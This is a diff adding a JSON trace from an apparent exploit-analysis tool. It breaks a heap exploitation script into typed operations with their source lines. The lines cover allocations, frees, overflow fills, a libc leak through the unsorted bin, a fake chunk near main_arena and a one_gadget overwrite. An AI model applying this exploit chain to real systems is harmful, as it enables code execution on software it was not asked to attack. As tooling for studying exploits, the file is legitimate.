@@ -1,0 +1,929 @@
+{
+  "run_id": "run-dbb0ff7ec6581f50",
+  "ops": [
+    {
+      "op_id": "op_001",
+      "kind": "alloc",
+      "handle": {
+        "kind": "concrete",
+        "ConcreteInt": 0,
+        "source": "0"
+      },
+      "menu_request": {
+        "kind": "concrete",
+        "ConcreteInt": 16,
+        "source": "0x10"
+      },
+      "allocator_request": {
+        "kind": "unknown",
+        "reason": "menu request is not proof of allocator request",
+        "source": "0x10"
+      },
+      "length": {
+        "kind": "unknown",
+        "reason": "length absent",
+        "source": ""
+      },
+      "payload": {
+        "kind": "unknown",
+        "reason": "payload absent",
+        "source": ""
+      },
+      "source_line": 62,
+      "source_call": "allocate(0x10)",
+      "confidence": "confirmed",
+      "contract_id": ""
+    },
+    {
+      "op_id": "op_002",
+      "kind": "alloc",
+      "handle": {
+        "kind": "concrete",
+        "ConcreteInt": 1,
+        "source": "1"
+      },
+      "menu_request": {
+        "kind": "concrete",
+        "ConcreteInt": 16,
+        "source": "0x10"
+      },
+      "allocator_request": {
+        "kind": "unknown",
+        "reason": "menu request is not proof of allocator request",
+        "source": "0x10"
+      },
+      "length": {
+        "kind": "unknown",
+        "reason": "length absent",
+        "source": ""
+      },
+      "payload": {
+        "kind": "unknown",
+        "reason": "payload absent",
+        "source": ""
+      },
+      "source_line": 63,
+      "source_call": "allocate(0x10)",
+      "confidence": "confirmed",
+      "contract_id": ""
+    },
+    {
+      "op_id": "op_003",
+      "kind": "alloc",
+      "handle": {
+        "kind": "concrete",
+        "ConcreteInt": 2,
+        "source": "2"
+      },
+      "menu_request": {
+        "kind": "concrete",
+        "ConcreteInt": 16,
+        "source": "0x10"
+      },
+      "allocator_request": {
+        "kind": "unknown",
+        "reason": "menu request is not proof of allocator request",
+        "source": "0x10"
+      },
+      "length": {
+        "kind": "unknown",
+        "reason": "length absent",
+        "source": ""
+      },
+      "payload": {
+        "kind": "unknown",
+        "reason": "payload absent",
+        "source": ""
+      },
+      "source_line": 64,
+      "source_call": "allocate(0x10)",
+      "confidence": "confirmed",
+      "contract_id": ""
+    },
+    {
+      "op_id": "op_004",
+      "kind": "alloc",
+      "handle": {
+        "kind": "concrete",
+        "ConcreteInt": 3,
+        "source": "3"
+      },
+      "menu_request": {
+        "kind": "concrete",
+        "ConcreteInt": 16,
+        "source": "0x10"
+      },
+      "allocator_request": {
+        "kind": "unknown",
+        "reason": "menu request is not proof of allocator request",
+        "source": "0x10"
+      },
+      "length": {
+        "kind": "unknown",
+        "reason": "length absent",
+        "source": ""
+      },
+      "payload": {
+        "kind": "unknown",
+        "reason": "payload absent",
+        "source": ""
+      },
+      "source_line": 65,
+      "source_call": "allocate(0x10)",
+      "confidence": "confirmed",
+      "contract_id": ""
+    },
+    {
+      "op_id": "op_005",
+      "kind": "alloc",
+      "handle": {
+        "kind": "concrete",
+        "ConcreteInt": 4,
+        "source": "4"
+      },
+      "menu_request": {
+        "kind": "concrete",
+        "ConcreteInt": 128,
+        "source": "0x80"
+      },
+      "allocator_request": {
+        "kind": "unknown",
+        "reason": "menu request is not proof of allocator request",
+        "source": "0x80"
+      },
+      "length": {
+        "kind": "unknown",
+        "reason": "length absent",
+        "source": ""
+      },
+      "payload": {
+        "kind": "unknown",
+        "reason": "payload absent",
+        "source": ""
+      },
+      "source_line": 66,
+      "source_call": "allocate(0x80)",
+      "confidence": "confirmed",
+      "contract_id": ""
+    },
+    {
+      "op_id": "op_006",
+      "kind": "delete",
+      "handle": {
+        "kind": "concrete",
+        "ConcreteInt": 2,
+        "source": "2"
+      },
+      "menu_request": {
+        "kind": "unknown",
+        "reason": "menu request not bound",
+        "source": ""
+      },
+      "allocator_request": {
+        "kind": "unknown",
+        "reason": "allocator request unproven",
+        "source": ""
+      },
+      "length": {
+        "kind": "unknown",
+        "reason": "length not bound",
+        "source": ""
+      },
+      "payload": {
+        "kind": "unknown",
+        "reason": "payload not bound",
+        "source": ""
+      },
+      "source_line": 68,
+      "source_call": "free(2)",
+      "confidence": "structural",
+      "contract_id": "contract:1055285cdc983b08"
+    },
+    {
+      "op_id": "op_007",
+      "kind": "delete",
+      "handle": {
+        "kind": "concrete",
+        "ConcreteInt": 1,
+        "source": "1"
+      },
+      "menu_request": {
+        "kind": "unknown",
+        "reason": "menu request not bound",
+        "source": ""
+      },
+      "allocator_request": {
+        "kind": "unknown",
+        "reason": "allocator request unproven",
+        "source": ""
+      },
+      "length": {
+        "kind": "unknown",
+        "reason": "length not bound",
+        "source": ""
+      },
+      "payload": {
+        "kind": "unknown",
+        "reason": "payload not bound",
+        "source": ""
+      },
+      "source_line": 69,
+      "source_call": "free(1)",
+      "confidence": "structural",
+      "contract_id": "contract:1055285cdc983b08"
+    },
+    {
+      "op_id": "op_008",
+      "kind": "edit",
+      "handle": {
+        "kind": "concrete",
+        "ConcreteInt": 0,
+        "source": "0"
+      },
+      "menu_request": {
+        "kind": "symbolic",
+        "LengthExpr": "len(payload)",
+        "source": ""
+      },
+      "allocator_request": {
+        "kind": "unknown",
+        "reason": "allocator request unproven",
+        "source": ""
+      },
+      "length": {
+        "kind": "symbolic",
+        "LengthExpr": "len(payload)",
+        "source": ""
+      },
+      "payload": {
+        "kind": "symbolic",
+        "SymbolicInt": "payload",
+        "source": ""
+      },
+      "source_line": 72,
+      "source_call": "fill(0, len(payload), payload)",
+      "confidence": "structural",
+      "contract_id": "contract:0dbe96ce8d710388"
+    },
+    {
+      "op_id": "op_009",
+      "kind": "edit",
+      "handle": {
+        "kind": "concrete",
+        "ConcreteInt": 3,
+        "source": "3"
+      },
+      "menu_request": {
+        "kind": "symbolic",
+        "LengthExpr": "len(payload)",
+        "source": ""
+      },
+      "allocator_request": {
+        "kind": "unknown",
+        "reason": "allocator request unproven",
+        "source": ""
+      },
+      "length": {
+        "kind": "symbolic",
+        "LengthExpr": "len(payload)",
+        "source": ""
+      },
+      "payload": {
+        "kind": "symbolic",
+        "SymbolicInt": "payload",
+        "source": ""
+      },
+      "source_line": 75,
+      "source_call": "fill(3, len(payload), payload)",
+      "confidence": "structural",
+      "contract_id": "contract:0dbe96ce8d710388"
+    },
+    {
+      "op_id": "op_010",
+      "kind": "alloc",
+      "handle": {
+        "kind": "concrete",
+        "ConcreteInt": 5,
+        "source": "5"
+      },
+      "menu_request": {
+        "kind": "concrete",
+        "ConcreteInt": 16,
+        "source": "0x10"
+      },
+      "allocator_request": {
+        "kind": "unknown",
+        "reason": "menu request is not proof of allocator request",
+        "source": "0x10"
+      },
+      "length": {
+        "kind": "unknown",
+        "reason": "length absent",
+        "source": ""
+      },
+      "payload": {
+        "kind": "unknown",
+        "reason": "payload absent",
+        "source": ""
+      },
+      "source_line": 76,
+      "source_call": "allocate(0x10)",
+      "confidence": "confirmed",
+      "contract_id": ""
+    },
+    {
+      "op_id": "op_011",
+      "kind": "alloc",
+      "handle": {
+        "kind": "concrete",
+        "ConcreteInt": 6,
+        "source": "6"
+      },
+      "menu_request": {
+        "kind": "concrete",
+        "ConcreteInt": 16,
+        "source": "0x10"
+      },
+      "allocator_request": {
+        "kind": "unknown",
+        "reason": "menu request is not proof of allocator request",
+        "source": "0x10"
+      },
+      "length": {
+        "kind": "unknown",
+        "reason": "length absent",
+        "source": ""
+      },
+      "payload": {
+        "kind": "unknown",
+        "reason": "payload absent",
+        "source": ""
+      },
+      "source_line": 77,
+      "source_call": "allocate(0x10)",
+      "confidence": "confirmed",
+      "contract_id": ""
+    },
+    {
+      "op_id": "op_012",
+      "kind": "edit",
+      "handle": {
+        "kind": "concrete",
+        "ConcreteInt": 3,
+        "source": "3"
+      },
+      "menu_request": {
+        "kind": "symbolic",
+        "LengthExpr": "len(payload)",
+        "source": ""
+      },
+      "allocator_request": {
+        "kind": "unknown",
+        "reason": "allocator request unproven",
+        "source": ""
+      },
+      "length": {
+        "kind": "symbolic",
+        "LengthExpr": "len(payload)",
+        "source": ""
+      },
+      "payload": {
+        "kind": "symbolic",
+        "SymbolicInt": "payload",
+        "source": ""
+      },
+      "source_line": 80,
+      "source_call": "fill(3, len(payload), payload)",
+      "confidence": "structural",
+      "contract_id": "contract:0dbe96ce8d710388"
+    },
+    {
+      "op_id": "op_013",
+      "kind": "alloc",
+      "handle": {
+        "kind": "concrete",
+        "ConcreteInt": 7,
+        "source": "7"
+      },
+      "menu_request": {
+        "kind": "concrete",
+        "ConcreteInt": 128,
+        "source": "0x80"
+      },
+      "allocator_request": {
+        "kind": "unknown",
+        "reason": "menu request is not proof of allocator request",
+        "source": "0x80"
+      },
+      "length": {
+        "kind": "unknown",
+        "reason": "length absent",
+        "source": ""
+      },
+      "payload": {
+        "kind": "unknown",
+        "reason": "payload absent",
+        "source": ""
+      },
+      "source_line": 82,
+      "source_call": "allocate(0x80)",
+      "confidence": "confirmed",
+      "contract_id": ""
+    },
+    {
+      "op_id": "op_014",
+      "kind": "delete",
+      "handle": {
+        "kind": "concrete",
+        "ConcreteInt": 4,
+        "source": "4"
+      },
+      "menu_request": {
+        "kind": "unknown",
+        "reason": "menu request not bound",
+        "source": ""
+      },
+      "allocator_request": {
+        "kind": "unknown",
+        "reason": "allocator request unproven",
+        "source": ""
+      },
+      "length": {
+        "kind": "unknown",
+        "reason": "length not bound",
+        "source": ""
+      },
+      "payload": {
+        "kind": "unknown",
+        "reason": "payload not bound",
+        "source": ""
+      },
+      "source_line": 83,
+      "source_call": "free(4)",
+      "confidence": "structural",
+      "contract_id": "contract:1055285cdc983b08"
+    },
+    {
+      "op_id": "op_015",
+      "kind": "show",
+      "handle": {
+        "kind": "concrete",
+        "ConcreteInt": 2,
+        "source": "2"
+      },
+      "menu_request": {
+        "kind": "unknown",
+        "reason": "menu request absent",
+        "source": ""
+      },
+      "allocator_request": {
+        "kind": "unknown",
+        "reason": "menu request is not proof of allocator request",
+        "source": ""
+      },
+      "length": {
+        "kind": "unknown",
+        "reason": "length absent",
+        "source": ""
+      },
+      "payload": {
+        "kind": "unknown",
+        "reason": "payload absent",
+        "source": ""
+      },
+      "source_line": 85,
+      "source_call": "dump(2)",
+      "confidence": "unknown",
+      "contract_id": ""
+    },
+    {
+      "op_id": "op_016",
+      "kind": "value",
+      "handle": {
+        "kind": "symbolic",
+        "SymbolicInt": "unsortedbin_addr",
+        "source": ""
+      },
+      "menu_request": {
+        "kind": "unknown",
+        "reason": "menu request absent",
+        "source": ""
+      },
+      "allocator_request": {
+        "kind": "unknown",
+        "reason": "menu request is not proof of allocator request",
+        "source": ""
+      },
+      "length": {
+        "kind": "unknown",
+        "reason": "length absent",
+        "source": ""
+      },
+      "payload": {
+        "kind": "unknown",
+        "reason": "payload absent",
+        "source": ""
+      },
+      "source_line": 87,
+      "source_call": "unsortedbin_addr = u64(p.recv(8))",
+      "confidence": "unknown",
+      "contract_id": ""
+    },
+    {
+      "op_id": "op_017",
+      "kind": "value",
+      "handle": {
+        "kind": "symbolic",
+        "SymbolicInt": "main_arena",
+        "source": ""
+      },
+      "menu_request": {
+        "kind": "unknown",
+        "reason": "menu request absent",
+        "source": ""
+      },
+      "allocator_request": {
+        "kind": "unknown",
+        "reason": "menu request is not proof of allocator request",
+        "source": ""
+      },
+      "length": {
+        "kind": "unknown",
+        "reason": "length absent",
+        "source": ""
+      },
+      "payload": {
+        "kind": "unknown",
+        "reason": "payload absent",
+        "source": ""
+      },
+      "source_line": 88,
+      "source_call": "main_arena = unsortedbin_addr - offset_unsortedbin_main_arena",
+      "confidence": "unknown",
+      "contract_id": ""
+    },
+    {
+      "op_id": "op_018",
+      "kind": "value",
+      "handle": {
+        "kind": "symbolic",
+        "SymbolicInt": "libc_base",
+        "source": ""
+      },
+      "menu_request": {
+        "kind": "unknown",
+        "reason": "menu request absent",
+        "source": ""
+      },
+      "allocator_request": {
+        "kind": "unknown",
+        "reason": "menu request is not proof of allocator request",
+        "source": ""
+      },
+      "length": {
+        "kind": "unknown",
+        "reason": "length absent",
+        "source": ""
+      },
+      "payload": {
+        "kind": "unknown",
+        "reason": "payload absent",
+        "source": ""
+      },
+      "source_line": 91,
+      "source_call": "libc_base = main_arena - main_arena_offset",
+      "confidence": "unknown",
+      "contract_id": ""
+    },
+    {
+      "op_id": "op_019",
+      "kind": "alloc",
+      "handle": {
+        "kind": "concrete",
+        "ConcreteInt": 8,
+        "source": "8"
+      },
+      "menu_request": {
+        "kind": "concrete",
+        "ConcreteInt": 96,
+        "source": "0x60"
+      },
+      "allocator_request": {
+        "kind": "unknown",
+        "reason": "menu request is not proof of allocator request",
+        "source": "0x60"
+      },
+      "length": {
+        "kind": "unknown",
+        "reason": "length absent",
+        "source": ""
+      },
+      "payload": {
+        "kind": "unknown",
+        "reason": "payload absent",
+        "source": ""
+      },
+      "source_line": 96,
+      "source_call": "allocate(0x60)",
+      "confidence": "confirmed",
+      "contract_id": ""
+    },
+    {
+      "op_id": "op_020",
+      "kind": "delete",
+      "handle": {
+        "kind": "concrete",
+        "ConcreteInt": 4,
+        "source": "4"
+      },
+      "menu_request": {
+        "kind": "unknown",
+        "reason": "menu request not bound",
+        "source": ""
+      },
+      "allocator_request": {
+        "kind": "unknown",
+        "reason": "allocator request unproven",
+        "source": ""
+      },
+      "length": {
+        "kind": "unknown",
+        "reason": "length not bound",
+        "source": ""
+      },
+      "payload": {
+        "kind": "unknown",
+        "reason": "payload not bound",
+        "source": ""
+      },
+      "source_line": 97,
+      "source_call": "free(4)",
+      "confidence": "structural",
+      "contract_id": "contract:1055285cdc983b08"
+    },
+    {
+      "op_id": "op_021",
+      "kind": "value",
+      "handle": {
+        "kind": "symbolic",
+        "SymbolicInt": "fake_chunk_addr",
+        "source": ""
+      },
+      "menu_request": {
+        "kind": "unknown",
+        "reason": "menu request absent",
+        "source": ""
+      },
+      "allocator_request": {
+        "kind": "unknown",
+        "reason": "menu request is not proof of allocator request",
+        "source": ""
+      },
+      "length": {
+        "kind": "unknown",
+        "reason": "length absent",
+        "source": ""
+      },
+      "payload": {
+        "kind": "unknown",
+        "reason": "payload absent",
+        "source": ""
+      },
+      "source_line": 99,
+      "source_call": "fake_chunk_addr = main_arena - 0x33",
+      "confidence": "unknown",
+      "contract_id": ""
+    },
+    {
+      "op_id": "op_022",
+      "kind": "edit",
+      "handle": {
+        "kind": "concrete",
+        "ConcreteInt": 2,
+        "source": "2"
+      },
+      "menu_request": {
+        "kind": "symbolic",
+        "LengthExpr": "len(fake_chunk)",
+        "source": ""
+      },
+      "allocator_request": {
+        "kind": "unknown",
+        "reason": "allocator request unproven",
+        "source": ""
+      },
+      "length": {
+        "kind": "symbolic",
+        "LengthExpr": "len(fake_chunk)",
+        "source": ""
+      },
+      "payload": {
+        "kind": "symbolic",
+        "SymbolicInt": "fake_chunk",
+        "source": ""
+      },
+      "source_line": 101,
+      "source_call": "fill(2, len(fake_chunk), fake_chunk)",
+      "confidence": "structural",
+      "contract_id": "contract:0dbe96ce8d710388"
+    },
+    {
+      "op_id": "op_023",
+      "kind": "alloc",
+      "handle": {
+        "kind": "concrete",
+        "ConcreteInt": 9,
+        "source": "9"
+      },
+      "menu_request": {
+        "kind": "concrete",
+        "ConcreteInt": 96,
+        "source": "0x60"
+      },
+      "allocator_request": {
+        "kind": "unknown",
+        "reason": "menu request is not proof of allocator request",
+        "source": "0x60"
+      },
+      "length": {
+        "kind": "unknown",
+        "reason": "length absent",
+        "source": ""
+      },
+      "payload": {
+        "kind": "unknown",
+        "reason": "payload absent",
+        "source": ""
+      },
+      "source_line": 103,
+      "source_call": "allocate(0x60)",
+      "confidence": "confirmed",
+      "contract_id": ""
+    },
+    {
+      "op_id": "op_024",
+      "kind": "alloc",
+      "handle": {
+        "kind": "concrete",
+        "ConcreteInt": 10,
+        "source": "10"
+      },
+      "menu_request": {
+        "kind": "concrete",
+        "ConcreteInt": 96,
+        "source": "0x60"
+      },
+      "allocator_request": {
+        "kind": "unknown",
+        "reason": "menu request is not proof of allocator request",
+        "source": "0x60"
+      },
+      "length": {
+        "kind": "unknown",
+        "reason": "length absent",
+        "source": ""
+      },
+      "payload": {
+        "kind": "unknown",
+        "reason": "payload absent",
+        "source": ""
+      },
+      "source_line": 104,
+      "source_call": "allocate(0x60)",
+      "confidence": "confirmed",
+      "contract_id": ""
+    },
+    {
+      "op_id": "op_025",
+      "kind": "value",
+      "handle": {
+        "kind": "symbolic",
+        "SymbolicInt": "one_gadget_addr",
+        "source": ""
+      },
+      "menu_request": {
+        "kind": "unknown",
+        "reason": "menu request absent",
+        "source": ""
+      },
+      "allocator_request": {
+        "kind": "unknown",
+        "reason": "menu request is not proof of allocator request",
+        "source": ""
+      },
+      "length": {
+        "kind": "unknown",
+        "reason": "length absent",
+        "source": ""
+      },
+      "payload": {
+        "kind": "unknown",
+        "reason": "payload absent",
+        "source": ""
+      },
+      "source_line": 106,
+      "source_call": "one_gadget_addr = libc_base + 0x4526a",
+      "confidence": "unknown",
+      "contract_id": ""
+    },
+    {
+      "op_id": "op_026",
+      "kind": "value",
+      "handle": {
+        "kind": "symbolic",
+        "SymbolicInt": "payload",
+        "source": ""
+      },
+      "menu_request": {
+        "kind": "unknown",
+        "reason": "menu request absent",
+        "source": ""
+      },
+      "allocator_request": {
+        "kind": "unknown",
+        "reason": "menu request is not proof of allocator request",
+        "source": ""
+      },
+      "length": {
+        "kind": "unknown",
+        "reason": "length absent",
+        "source": ""
+      },
+      "payload": {
+        "kind": "unknown",
+        "reason": "payload absent",
+        "source": ""
+      },
+      "source_line": 107,
+      "source_call": "payload = 0x13 * 'a' + p64(one_gadget_addr)",
+      "confidence": "unknown",
+      "contract_id": ""
+    },
+    {
+      "op_id": "op_027",
+      "kind": "edit",
+      "handle": {
+        "kind": "concrete",
+        "ConcreteInt": 6,
+        "source": "6"
+      },
+      "menu_request": {
+        "kind": "symbolic",
+        "LengthExpr": "len(payload)",
+        "source": ""
+      },
+      "allocator_request": {
+        "kind": "unknown",
+        "reason": "allocator request unproven",
+        "source": ""
+      },
+      "length": {
+        "kind": "symbolic",
+        "LengthExpr": "len(payload)",
+        "source": ""
+      },
+      "payload": {
+        "kind": "symbolic",
+        "SymbolicInt": "payload",
+        "source": ""
+      },
+      "source_line": 108,
+      "source_call": "fill(6, len(payload), payload)",
+      "confidence": "structural",
+      "contract_id": "contract:0dbe96ce8d710388"
+    },
+    {
+      "op_id": "op_028",
+      "kind": "alloc",
+      "handle": {
+        "kind": "concrete",
+        "ConcreteInt": 11,
+        "source": "11"
+      },
+      "menu_request": {
+        "kind": "concrete",
+        "ConcreteInt": 256,
+        "source": "0x100"
+      },
+      "allocator_request": {
+        "kind": "unknown",
+        "reason": "menu request is not proof of allocator request",
+        "source": "0x100"
+      },
+      "length": {
+        "kind": "unknown",
+        "reason": "length absent",
+        "source": ""
+      },
+      "payload": {
+        "kind": "unknown",
+        "reason": "payload absent",
+        "source": ""
+      },
+      "source_line": 110,
+      "source_call": "allocate(0x100)",
+      "confidence": "confirmed",
+      "contract_id": ""
+    }
+  ]
+}
